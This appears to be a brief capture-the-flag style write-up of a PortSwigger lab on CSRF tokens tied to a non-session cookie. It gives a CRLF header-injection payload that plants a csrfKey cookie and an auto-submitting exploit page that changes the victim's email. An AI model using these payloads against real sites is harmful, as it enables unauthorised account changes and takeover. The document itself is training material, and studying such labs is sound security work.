# [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

> the `csrf` token not tied to the user but the `csrfKey` cookie, so if that two key in sync even if they are from different users, it will auth the request

> the way to inject a different cookie:

`/?search=test%0d%0aSet-Cookie:%20csrfKey=yyy%3b%20SameSite=None`

url decode ->

```
/?search=test
Set-Cookie: csrfKey=yyy; SameSite=None
```

> the exploit will work with a `img` tag:

```
<img
  src="https://xxx.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=yyy%3b%20SameSite=None"
  onerror="document.forms[0].submit()"
/>
```

url decode ->

```
<img
  src="https://xxx.web-security-academy.net/?search=test
Set-Cookie: csrfKey=yyy; SameSite=None"
  onerror="document.forms[0].submit()"
/>
```

> the exploit itself:

```
<form method="POST" action="https://xxx.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="duck@quack" />
  <input type="hidden" name="csrf" value="8nRbkMKpdXRhb2J2pykxmokZ19VYt4DQ" />
</form>
<img
  src="https://xxx.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=yyy%3b%20SameSite=None"
  onerror="document.forms[0].submit()"
/>
```
